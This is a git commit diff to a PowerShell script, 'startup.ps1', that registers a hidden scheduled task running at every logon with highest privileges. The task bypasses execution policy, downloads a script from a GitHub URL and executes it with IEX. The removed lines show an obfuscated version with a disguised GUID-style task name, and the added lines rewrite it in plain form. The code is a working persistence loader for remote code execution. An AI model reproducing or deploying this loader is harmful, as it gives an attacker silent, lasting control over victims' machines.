21d019c5da6c8cd95c591983883ecd35b27e9b66
43a1723 <hai1723notgay@gmail.com>
2024-06-21 10:00:01 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,9 +1,11 @@
-$powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode')"
-$need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
-$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need `"IEX($download)`"" 
+$powershellcode = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
+$download = "(New-Object Net.WebClient).DownloadString('$powershellcode')"
+$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX $download }"
+
+$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "{FE75EAA7-323E-4B5C-B3B3-86C0B79424E7}"
-$task_desc = "`n"
+$task_name = "TaskNameHere"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
+$task_desc = "Scheduled task to download and execute script"
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
